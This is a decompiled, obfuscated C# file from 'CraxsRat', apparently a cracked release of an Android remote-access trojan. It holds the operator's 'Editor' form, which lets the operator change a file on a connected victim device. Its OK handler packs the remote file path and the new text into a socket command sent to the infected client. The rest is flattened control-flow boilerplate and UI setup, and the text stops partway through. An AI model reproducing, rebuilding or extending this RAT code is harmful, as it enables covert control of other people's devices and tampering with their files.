// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.Editor
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.sockets;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class Editor : Form
  {
    private string TargetAPKPATH;
    private string TargetApkicon;
    private string originalapkname;
    private string APKINFO;
    private Process cmdProcess;
    private string WorkDIR;
    private string outputpath;
    private string buildapkpath;
    private string assetspath;

    internal virtual RichTextBox EditText
    {
      get => ((FileManager) this)._EditText;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.EditText_TextChanged);
label_1:
        int num1 = 1734690085;
        RichTextBox editText;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(-num1 - (1415966799 + ((253209054 - -754564346 ^ -1657472539 * -1748081147) + (661135157 - 2076040879 ^ ~1524280312))) ^ 1809718578)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              editText.TextChanged += eventHandler;
              num1 = (int) num2 * 84191017 ^ 2109442554;
              continue;
            case 3:
              editText = ((FileManager) this)._EditText;
              int num3 = editText == null ? 1860602241 : (num3 = 1173481953);
              num1 = num3 ^ (int) num2 * -1577050515;
              continue;
            case 4:
              editText.TextChanged -= eventHandler;
              num1 = (int) num2 * 600240105 ^ -1372084112;
              continue;
            case 5:
              editText = ((FileManager) this)._EditText;
              int num4 = editText == null ? -1571092246 : (num4 = 1996976192);
              num1 = num4 ^ (int) num2 * -1846555463;
              continue;
            case 6:
              ((FileManager) this)._EditText = value;
              num1 = 1909667958;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Button b_ok
    {
      get => ((FileManager) this)._b_ok;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.b_ok_Click);
label_1:
        int num1 = 1379102203;
        while (true)
        {
          int num2 = num1;
          uint num3;
          Button bOk;
          switch ((num3 = (uint) (~((215461910 ^ ~~-1796828008) - (num2 ^ -(--637095527 ^ -534666246 - -2001523427) - -(223496113 * ~-868269548) ^ (1096629820 - 687728734 - 1805196982) * 973455231 - 1935693043 ^ 74294635 * 612546046 * -2083944637 * -284201213 + ((594493698 - 1890559288) * -815180557 - 129024002))) - (669796854 - 1221100346) - 346447800)) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              bOk.Click -= eventHandler;
              num1 = (int) num3 * 1030022882 ^ 1902416394;
              continue;
            case 2:
              bOk.Click += eventHandler;
              num1 = (int) num3 * -1683130654 ^ -22529383;
              continue;
            case 3:
              int num4 = bOk == null ? 928696112 : (num4 = 307023574);
              num1 = num4 ^ (int) num3 * 402731032;
              continue;
            case 4:
              goto label_3;
            case 5:
              bOk = ((FileManager) this)._b_ok;
              int num5 = bOk == null ? 1587546846 : (num5 = -249988684);
              num1 = num5 ^ (int) num3 * -774989361;
              continue;
            case 6:
              bOk = ((FileManager) this)._b_ok;
              num1 = (int) num3 * -599638116 ^ 2030816492;
              continue;
            case 7:
              ((FileManager) this)._b_ok = value;
              num1 = -507396030;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Panel Panel1
    {
      get => ((FileManager) this)._Panel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((FileManager) this)._Panel1 = value;
    }

    internal virtual Timer TOpacity
    {
      get => ((FileManager) this)._TOpacity;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TOpacity_Tick);
label_1:
        int num1 = -689081296;
        Timer topacity;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -(-num1 - ~(-~-1775534421 - -430025829))) % 8U)
          {
            case 0:
              topacity.Tick -= eventHandler;
              num1 = (int) num2 * 1684127629 ^ -348437683;
              continue;
            case 1:
              topacity.Tick += eventHandler;
              num1 = (int) num2 * -401334309 ^ 1921143530;
              continue;
            case 2:
              goto label_1;
            case 3:
              ((FileManager) this)._TOpacity = value;
              num1 = -697906402;
              continue;
            case 4:
              topacity = ((FileManager) this)._TOpacity;
              int num3 = topacity == null ? 1463645893 : (num3 = -1464370457);
              num1 = num3 ^ (int) num2 * -802790977;
              continue;
            case 5:
              int num4 = topacity == null ? 1145736110 : (num4 = 256675185);
              num1 = num4 ^ (int) num2 * -251442673;
              continue;
            case 6:
              topacity = ((FileManager) this)._TOpacity;
              num1 = (int) num2 * 2098436324 ^ 171642015;
              continue;
            case 7:
              goto label_3;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual ContextMenuStrip CMenu
    {
      get => ((FileManager) this)._CMenu;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((FileManager) this)._CMenu = value;
    }

    internal virtual ToolStripMenuItem CutToolStripMenuItem
    {
      get => ((FileManager) this)._CutToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CutToolStripMenuItem_Click);
label_1:
        int num1 = 1618340253;
        while (true)
        {
          int num2 = num1;
          uint num3;
          ToolStripMenuItem toolStripMenuItem;
          switch ((num3 = (uint) -((1958920157 - 880088903 + (294526883 - 2100613827) - (~~(-1928095916 ^ -1120454182) - (num2 * 1704677647 + (-1964764193 * -2122079975 + 935495839)))) * -1205395503)) % 7U)
          {
            case 0:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num3 * 1757074645 ^ -1109170726;
              continue;
            case 1:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num3 * 1625683802 ^ -52909961;
              continue;
            case 2:
              int num4 = toolStripMenuItem == null ? 1379709911 : (num4 = -1758147678);
              num1 = num4 ^ (int) num3 * 959094506;
              continue;
            case 3:
              goto label_3;
            case 4:
              goto label_1;
            case 5:
              toolStripMenuItem = ((FileManager) this)._CutToolStripMenuItem;
              int num5 = toolStripMenuItem == null ? 541895374 : (num5 = -831960294);
              num1 = num5 ^ (int) num3 * -1344770331;
              continue;
            case 6:
              ((FileManager) this)._CutToolStripMenuItem = value;
              toolStripMenuItem = ((FileManager) this)._CutToolStripMenuItem;
              num1 = -480039606;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual ToolStripMenuItem CopyToolStripMenuItem
    {
      get => ((FileManager) this)._CopyToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CopyToolStripMenuItem_Click);
        ToolStripMenuItem toolStripMenuItem = ((FileManager) this)._CopyToolStripMenuItem;
label_1:
        int num1 = 666789342;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) -(~((-(-(2051569977 * 1557161328) ^ -1801839547) + (-1212506217 * 1168081333 + 43989169 - -941778035 * 1768307449) * 875562755 - num2) * -1188216651) + (~1958575532 - 217279824) - 1941487941)) % 7U)
          {
            case 0:
              goto label_3;
            case 1:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num3 * 1752696629 ^ -1125899707;
              continue;
            case 2:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num3 * 1128848683 ^ -283866418;
              continue;
            case 3:
              ((FileManager) this)._CopyToolStripMenuItem = value;
              num1 = -8547776;
              continue;
            case 4:
              int num4 = toolStripMenuItem == null ? 228671556 : (num4 = 935056265);
              num1 = num4 ^ (int) num3 * -1636325304;
              continue;
            case 5:
              toolStripMenuItem = ((FileManager) this)._CopyToolStripMenuItem;
              int num5 = toolStripMenuItem == null ? 1309938207 : (num5 = 169572437);
              num1 = num5 ^ (int) num3 * -345934982;
              continue;
            case 6:
              goto label_1;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual ToolStripMenuItem PasteToolStripMenuItem
    {
      get => ((FileManager) this)._PasteToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.PasteToolStripMenuItem_Click);
        ToolStripMenuItem toolStripMenuItem = ((FileManager) this)._PasteToolStripMenuItem;
label_1:
        int num1 = -1716252766;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((num1 * -972006785 ^ ~-1415894772) * -427913083 + ~2022875466 - --1209721671 + 1722658518)) % 8U)
          {
            case 0:
              ((FileManager) this)._PasteToolStripMenuItem = value;
              num1 = 767669443;
              continue;
            case 1:
              int num3 = toolStripMenuItem == null ? 709178549 : (num3 = 591911574);
              num1 = num3 ^ (int) num2 * 1635161041;
              continue;
            case 2:
              toolStripMenuItem = ((FileManager) this)._PasteToolStripMenuItem;
              num1 = (int) num2 * -101940502 ^ -1521550926;
              continue;
            case 3:
              goto label_1;
            case 4:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * 367613517 ^ 617618413;
              continue;
            case 5:
              int num4 = toolStripMenuItem == null ? 1416633718 : (num4 = -1416813150);
              num1 = num4 ^ (int) num2 * -2059529989;
              continue;
            case 6:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * -941705715 ^ -961485734;
              continue;
            case 7:
              goto label_3;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    public Editor()
    {
label_1:
      int num1 = -1075624446;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((((num1 ^ ~1706712294 * 325321161) + ~681433529) * -1758204967 + -29304845 * 1240825933 ^ 412760633 ^ -292041756) - -1563079132)) % 6U)
        {
          case 0:
            ((FileManager) this).Title = EXGuarder.\u003105F0A0A;
            num1 = (int) num2 * 1121549799 ^ -928420454;
            continue;
          case 1:
            this.Load += new EventHandler(this.Editor_Load);
            num1 = (int) num2 * -537818624 ^ -86984775;
            continue;
          case 2:
            this.Activated += new EventHandler(this.Editor_Activated);
            num1 = (int) num2 * 2129193878 ^ 341884634;
            continue;
          case 4:
            goto label_1;
          case 5:
            ((FileManager) this).path = (string) null;
            num1 = (int) num2 * -872430504 ^ -1272359031;
            continue;
          default:
            goto label_7;
        }
      }
label_7:
      ((EditConnections) this).InitializeComponent();
      this.Font = Settings.f;
    }

    private void SpyStyle()
    {
      IEnumerator<Button> enumerator1;
      try
      {
        enumerator1 = this.Panel1.Controls.OfType<Button>().GetEnumerator();
label_1:
        int num1 = 1328046743;
        Button current;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((num1 ^ (-2115476417 * -1354662639 ^ -1476510896 ^ 1760982885 ^ -(~2031434370 - (-144738477 - -891212504))) - -((314647195 ^ 490805439 * -1840028783) - ~-342064255) ^ -(-1199556279 * ((1151196226 ^ -156477523) * 1096988109))) + (1952929449 - (27347727 - -1861761571 ^ 874789568 + 1135495484)) + 1706404053 - (2042425279 ^ 1771175813) ^ -279932704)) % 6U)
          {
            case 1:
              current = enumerator1.Current;
              current.BackColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              num1 = 1438367446;
              continue;
            case 2:
              num1 = (int) num2 * 1402557513 ^ 1196822312;
              continue;
            case 3:
              current.ForeColor = Settings.DefaultColor_Background;
              num1 = (int) num2 * -464247977 ^ -631290865;
              continue;
            case 4:
              goto label_1;
            case 5:
              int num3;
              num1 = num3 = enumerator1.MoveNext() ? -1673779128 : (num3 = -1093114313);
              continue;
            default:
              goto label_12;
          }
        }
      }
      finally
      {
        if (enumerator1 != null)
        {
label_8:
          int num4 = 1857424563;
          while (true)
          {
            uint num5;
            switch ((num5 = (uint) ((num4 ^ (-2115476417 * -1354662639 ^ -1476510896 ^ 1760982885 ^ -(~2031434370 - (-144738477 - -891212504))) - -((314647195 ^ 490805439 * -1840028783) - ~-342064255) ^ -(-1199556279 * ((1151196226 ^ -156477523) * 1096988109))) + (1952929449 - (27347727 - -1861761571 ^ 874789568 + 1135495484)) + 1706404053 - (2042425279 ^ 1771175813) ^ -279932704)) % 3U)
            {
              case 1:
                enumerator1.Dispose();
                num4 = (int) num5 * -443001347 ^ -465156066;
                continue;
              case 2:
                goto label_8;
              default:
                goto label_11;
            }
          }
        }
label_11:;
      }
label_12:
      IEnumerator<RichTextBox> enumerator2;
      try
      {
        enumerator2 = this.Controls.OfType<RichTextBox>().GetEnumerator();
label_17:
        int num6 = enumerator2.MoveNext() ? -1391323331 : (num6 = 1463973250);
        RichTextBox current;
        while (true)
        {
          uint num7;
          switch ((num7 = (uint) ((num6 ^ (-2115476417 * -1354662639 ^ -1476510896 ^ 1760982885 ^ -(~2031434370 - (-144738477 - -891212504))) - -((314647195 ^ 490805439 * -1840028783) - ~-342064255) ^ -(-1199556279 * ((1151196226 ^ -156477523) * 1096988109))) + (1952929449 - (27347727 - -1861761571 ^ 874789568 + 1135495484)) + 1706404053 - (2042425279 ^ 1771175813) ^ -279932704)) % 5U)
          {
            case 1:
              current.BackColor = Settings.DefaultColor_Background;
              num6 = (int) num7 * 1603506844 ^ 457752125;
              continue;
            case 2:
              goto label_17;
            case 3:
              current = enumerator2.Current;
              current.ForeColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              num6 = 2041682810;
              continue;
            case 4:
              num6 = -1391323331;
              continue;
            default:
              goto label_23;
          }
        }
      }
      finally
      {
        if (enumerator2 != null)
        {
label_19:
          int num8 = -1683226069;
          while (true)
          {
            uint num9;
            switch ((num9 = (uint) ((num8 ^ (-2115476417 * -1354662639 ^ -1476510896 ^ 1760982885 ^ -(~2031434370 - (-144738477 - -891212504))) - -((314647195 ^ 490805439 * -1840028783) - ~-342064255) ^ -(-1199556279 * ((1151196226 ^ -156477523) * 1096988109))) + (1952929449 - (27347727 - -1861761571 ^ 874789568 + 1135495484)) + 1706404053 - (2042425279 ^ 1771175813) ^ -279932704)) % 3U)
            {
              case 0:
                goto label_19;
              case 1:
                enumerator2.Dispose();
                num8 = (int) num9 * 1264496103 ^ 1077910563;
                continue;
              default:
                goto label_22;
            }
          }
        }
label_22:;
      }
label_23:
      IEnumerator<Panel> enumerator3;
      try
      {
        enumerator3 = this.Controls.OfType<Panel>().GetEnumerator();
label_24:
        int num10 = 1848689276;
        Panel current;
        while (true)
        {
          uint num11;
          switch ((num11 = (uint) ((num10 ^ (-2115476417 * -1354662639 ^ -1476510896 ^ 1760982885 ^ -(~2031434370 - (-144738477 - -891212504))) - -((314647195 ^ 490805439 * -1840028783) - ~-342064255) ^ -(-1199556279 * ((1151196226 ^ -156477523) * 1096988109))) + (1952929449 - (27347727 - -1861761571 ^ 874789568 + 1135495484)) + 1706404053 - (2042425279 ^ 1771175813) ^ -279932704)) % 6U)
          {
            case 0:
              goto label_24;
            case 1:
              int num12;
              num10 = num12 = enumerator3.MoveNext() ? 1738467249 : (num12 = 1665048745);
              continue;
            case 2:
              goto label_34;
            case 3:
              num10 = (int) num11 * -1513163233 ^ -869327167;
              continue;
            case 4:
              current = enumerator3.Current;
              num10 = -1815688736;
              continue;
            case 5:
              current.BackColor = Settings.DefaultColor_Background;
              num10 = (int) num11 * 2090983628 ^ -2069274038;
              continue;
            default:
              goto label_30;
          }
        }
label_34:
        return;
label_30:;
      }
      finally
      {
        if (enumerator3 != null)
        {
label_32:
          int num13 = -1437675659;
          while (true)
          {
            uint num14;
            switch ((num14 = (uint) ((num13 ^ (-2115476417 * -1354662639 ^ -1476510896 ^ 1760982885 ^ -(~2031434370 - (-144738477 - -891212504))) - -((314647195 ^ 490805439 * -1840028783) - ~-342064255) ^ -(-1199556279 * ((1151196226 ^ -156477523) * 1096988109))) + (1952929449 - (27347727 - -1861761571 ^ 874789568 + 1135495484)) + 1706404053 - (2042425279 ^ 1771175813) ^ -279932704)) % 3U)
            {
              case 1:
                enumerator3.Dispose();
                num13 = (int) num14 * 623958109 ^ -1514815220;
                continue;
              case 2:
                goto label_32;
              default:
                goto label_36;
            }
          }
        }
label_36:;
      }
    }

    private void TOpacity_Tick(object sender, EventArgs e)
    {
      if (this.Opacity == 1.0)
        goto label_5;
label_1:
      int num1 = 1842378813;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-(~(num1 + ((--9526818 - (1713036084 - 845352166 ^ -1040466473 * -874603540) ^ 1451562927 * -~788436897) - ~-1686896421)) + (1106761801 - -(-736209698 - -1329522047)) + -573562485 * (-943097781 * -1393209059)) - 398971026)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            goto label_5;
          case 3:
            this.Opacity += 0.1;
            num1 = (int) num2 * 464250467 ^ -359320318;
            continue;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:
      return;
label_5:
      this.TOpacity.Enabled = false;
      num1 = 1519180843;
      goto label_2;
    }

    private void Editor_Load(object sender, EventArgs e)
    {
      this.Icon = new Icon(Settings.res_Path + EXGuarder.\u003225F2376);
label_1:
      int num1 = 1698079459;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~(~(~num1 - (-(-393377262 ^ 1597684223 - -1858591364) - -991632005 * ((1426855657 ^ 2041343233) + -1190858003 * 153622362))) ^ ~-1857510907 - (661554646 + 558676810) ^ 2133071715 * 1767552698)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            this.EditText.ContextMenuStrip = this.CMenu;
            num1 = (int) num2 * -487989853 ^ -720187047;
            continue;
          case 2:
            goto label_3;
          case 3:
            this.SpyStyle();
            num1 = (int) num2 * -1313097625 ^ 511339112;
            continue;
          case 4:
            this.Text = ((FileManager) this).Title;
            this.TOpacity.Interval = Settings.T_Interval;
            this.TOpacity.Enabled = true;
            num1 = (int) num2 * -570167303 ^ 69114061;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    private void EditText_TextChanged(object sender, EventArgs e)
    {
      if (!(!this.b_ok.Visible & ((FileManager) this).status))
        return;
label_1:
      int num1 = -1130187101;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ((-(((~(-1712564291 * 1718485513) ^ -1119297821 ^ 949462522 + 1836027159 ^ 1337113174) - (849469539 ^ (-731720702 - 1424480834 ^ -575798493 - 434443702) * -1056629511) - num2 - ((-333037352 - -146702879 - 329219232) * 1861325973 - ~(-1979726445 - 1986401060 ^ -199694947 * -1790769565))) * -576773587) ^ ~525610650) * 515859155)) % 3U)
        {
          case 0:
            goto label_5;
          case 1:
            this.b_ok.Visible = true;
            num1 = (int) num3 * -872318232 ^ 1468779506;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    private void Editor_Activated(object sender, EventArgs e) => ((FileManager) this).status = true;

    private void b_ok_Click(object sender, EventArgs e)
    {
      if (!(((FileManager) this).classClient != null & Operators.CompareString(((FileManager) this).path, (string) null, false) != 0))
        return;
label_1:
      int num1 = -83859076;
      object[] ParametersObjects;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~-(num1 * 2082660477 + ~((-66707612 ^ 1790029056) - 270562928 - ~--584283008)) * 1111135223 ^ -1833258493)) % 7U)
        {
          case 0:
            this.Close();
            num1 = (int) num2 * 833936377 ^ -1166431557;
            continue;
          case 1:
            goto label_9;
          case 2:
            goto label_1;
          case 3:
            int num3 = this.EditText.Text.Length <= 0 ? -1023177480 : (num3 = 560983161);
            num1 = num3 ^ (int) num2 * -334666274;
            continue;
          case 4:
            ((FileManager) this).classClient.SendMessage(ParametersObjects);
            num1 = -1556905184;
            continue;
          case 5:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) ((FileManager) this).Client,
              (object) (Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u00321170B20 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00359176861 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Client.resultClient + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003712B0509 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + ((FileManager) this).path + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + this.EditText.Text),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00350662221),
              (object) ((FileManager) this).classClient
            };
            num1 = (int) num2 * -932159469 ^ -1833595829;
            continue;
          case 6:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) ((FileManager) this).Client,
              (object) (Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u00321170B20 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00359176861 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Client.resultClient + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0030A370518 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + ((FileManager) this).path),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00350662221),
              (object) ((FileManager) this).classClient
            };
            num1 = 474300584;
            continue;
          default:
            goto label_10;
        }
      }
label_9:
      return;
label_10:;
    }

    private void CutToolStripMenuItem_Click(object sender, EventArgs e) => this.EditText.Cut();

    private void CopyToolStripMenuItem_Click(object sender, EventArgs e) => this.EditText.Copy();

    private void PasteToolStripMenuItem_Click(object sender, EventArgs e) => this.EditText.Paste();

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing)
          return;
label_1:
        int num1 = 182662517;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~~(num1 * 1686866539) - (~130027856 ^ 916647427 ^ -1249540630) + ~1761383924 - -612124534)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              int num3 = ((FileManager) this).components == null ? 961401268 : (num3 = -1316019922);
              num1 = num3 ^ (int) num2 * -266000493;
              continue;
            case 3:
              ((FileManager) this).components.Dispose();
              num1 = (int) num2 * -1465123591 ^ 1789774313;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ((FileManager) this).components = (IContainer) new System.ComponentModel.Container();
      DataGridViewCellStyle gridViewCellStyle1 = new DataGridViewCellStyle();
      DataGridViewCellStyle gridViewCellStyle2 = new DataGridViewCellStyle();
      ((EditSocket) this).PanelBOX = new Panel();
      ((EditSocket) this).OKY = new Button();
label_1:
      int num1 = -2092790001;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-(-(num1 * -246013491) + 1688523107 * (~-986232257 ^ 1853446552) ^ -917182518 + --1927023119) - -767425801)) % 112U)
        {
          case 0:
            ((EditSocket) this).DGV0.AutoSizeRowsMode = DataGridViewAutoSizeRowsMode.AllCells;
            num1 = (int) num2 * 1394795229 ^ 1123681387;
            continue;
          case 1:
            ((EditSocket) this).T0.Name = EXGuarder.\u00320316836;
            num1 = (int) num2 * -1293635805 ^ -1137913197;
            continue;
          case 2:
            gridViewCellStyle1.WrapMode = DataGridViewTriState.True;
            ((EditSocket) this).DGV0.ColumnHeadersDefaultCellStyle = gridViewCellStyle1;
            ((EditSocket) this).DGV0.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            num1 = (int) num2 * 1392568426 ^ 20916653;
            continue;
          case 3:
            ((EditSocket) this).btnUp.ForeColor = Color.Black;
            ((EditSocket) this).btnUp.Location = new Point(185, 241);
            ((EditSocket) this).btnUp.Name = EXGuarder.\u003175A032D;
            num1 = (int) num2 * -1565068530 ^ -1225207596;
            continue;
          case 4:
            ((EditSocket) this).btnUp.TabIndex = 14;
            num1 = (int) num2 * 28762995 ^ -642875742;
            continue;
          case 5:
            ((EditSocket) this).DGV0.EditMode = DataGridViewEditMode.EditProgrammatically;
            num1 = (int) num2 * 574419228 ^ -1765534686;
            continue;
          case 6:
            ((EditSocket) this).Label2.ForeColor = Color.FromArgb(190, 190, 190);
            num1 = (int) num2 * -2042586528 ^ 1730897570;
            continue;
          case 7:
            ((EditSocket) this).Column2.HeaderText = EXGuarder.\u0035E2C6162;
            num1 = (int) num2 * 463718007 ^ 660838717;
            continue;
          case 8:
            ((EditSocket) this).OKY.FlatStyle = FlatStyle.Flat;
            num1 = (int) num2 * -1536770584 ^ -1487494473;
            continue;
          case 9:
            ((ISupportInitialize) ((EditSocket) this).DGV0).BeginInit();
            num1 = (int) num2 * -843949235 ^ -1436082107;
            continue;
          case 10:
            gridViewCellStyle2.SelectionForeColor = Color.Black;
            gridViewCellStyle2.WrapMode = DataGridViewTriState.False;
            num1 = (int) num2 * 657742829 ^ -2140138522;
            continue;
          case 11:
            ((EditSocket) this).b_Add.ForeColor = Color.Black;
            ((EditSocket) this).b_Add.Location = new Point(185, 130);
            ((EditSocket) this).b_Add.Name = EXGuarder.\u003552E7308;
            num1 = (int) num2 * 720200913 ^ -632171627;
            continue;
          case 12:
            ((EditSocket) this).btnDown.ForeColor = Color.Black;
            num1 = (int) num2 * -676072528 ^ -27997136;
            continue;
          case 13:
            ((EditSocket) this).TextIP.BorderStyle = BorderStyle.None;
            num1 = (int) num2 * 2006992472 ^ -1546911958;
            continue;
          case 14:
            ((EditSocket) this).btnUp.Size = new Size(67, 23);
            num1 = (int) num2 * -397335090 ^ 1917479800;
            continue;
          case 15:
            gridViewCellStyle2.BackColor = Color.Black;
            num1 = (int) num2 * 1327618644 ^ -1773809075;
            continue;
          case 16:
            ((EditSocket) this).PanelBOX.Size = new Size(269, 362);
            num1 = (int) num2 * 639399700 ^ -695877271;
            continue;
          case 17:
            goto label_1;
          case 18:
            ((EditSocket) this).Label2.Location = new Point(182, 75);
            num1 = (int) num2 * 1099073746 ^ 1759479178;
            continue;
          case 19:
            ((EditSocket) this).Column2 = new DataGridViewTextBoxColumn();
            ((EditSocket) this).po = new NumericUpDown();
            num1 = (int) num2 * 1779498609 ^ -172927994;
            continue;
          case 20:
            ((EditSocket) this).T0.AutoSize = true;
            num1 = (int) num2 * -1072093345 ^ 1172352756;
            continue;
          case 21:
            ((EditSocket) this).OKY.UseVisualStyleBackColor = false;
            num1 = (int) num2 * -1562188274 ^ 1731721416;
            continue;
          case 22:
            ((EditSocket) this).b_del.FlatStyle = FlatStyle.Flat;
            num1 = (int) num2 * 1791101542 ^ 1674209937;
            continue;
          case 23:
            ((EditSocket) this).DGV0.AllowUserToDeleteRows = false;
            num1 = (int) num2 * 1999795894 ^ -749435681;
            continue;
          case 24:
            ((EditSocket) this).DGV0.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.Fill;
            num1 = (int) num2 * 1661070204 ^ -1360928488;
            continue;
          case 25:
            ((EditSocket) this).DGV0.BackgroundColor = Color.Black;
            num1 = (int) num2 * 1541187029 ^ -1119042790;
            continue;
          case 26:
            ((EditSocket) this).TextIP.Name = EXGuarder.\u0035B0F6708;
            ((EditSocket) this).TextIP.Size = new Size(173, 13);
            ((EditSocket) this).TextIP.TabIndex = 0;
            ((EditSocket) this).TextIP.Text = EXGuarder.\u00358704936;
            num1 = (int) num2 * -1734907141 ^ 1413686731;
            continue;
          case 27:
            ((EditSocket) this).TextIP = new TextBox();
            ((EditSocket) this).TOpacity = new Timer(((FileManager) this).components);
            ((EditSocket) this).PanelBOX.SuspendLayout();
            num1 = (int) num2 * 726128474 ^ 371973733;
            continue;
          case 28:
            ((EditSocket) this).DGV0.DefaultCellStyle = gridViewCellStyle2;
            num1 = (int) num2 * 357798290 ^ 212446671;
            continue;
          case 29:
            this.Controls.Add((Control) ((EditSocket) this).PanelBOX);
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;
            this.Name = EXGuarder.\u00358155C1B;
            num1 = (int) num2 * 842966024 ^ 1196080528;
            continue;
          case 30:
            ((EditSocket) this).DGV0.EnableHeadersVisualStyles = false;
            ((EditSocket) this).DGV0.GridColor = Color.FromArgb(42, 42, 42);
            num1 = (int) num2 * 2010827508 ^ 1012603155;
            continue;
          case 31:
            ((EditSocket) this).PanelBOX.Controls.Add((Control) ((EditSocket) this).TextIP);
            num1 = (int) num2 * -1205035778 ^ 1954624584;
            continue;
          case 32:
            ((EditSocket) this).DGV0.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
            num1 = (int) num2 * 1596276055 ^ 885524390;
            continue;
          case 33:
            ((EditSocket) this).PanelBOX.Name = EXGuarder.\u00308584152;
            num1 = (int) num2 * -81097044 ^ -1591102748;
            continue;
          case 34:
            ((EditSocket) this).b_del = new Button();
            ((EditSocket) this).DGV0 = new DataGridView();
            num1 = (int) num2 * -2051964454 ^ 1870804585;
            continue;
          case 35:
            ((EditSocket) this).b_del.UseVisualStyleBackColor = false;
            num1 = (int) num2 * 686876340 ^ -1608665058;
            continue;
          case 36:
            gridViewCellStyle1.SelectionBackColor = SystemColors.Highlight;
            num1 = (int) num2 * -594179651 ^ 480568541;
            continue;
          case 37:
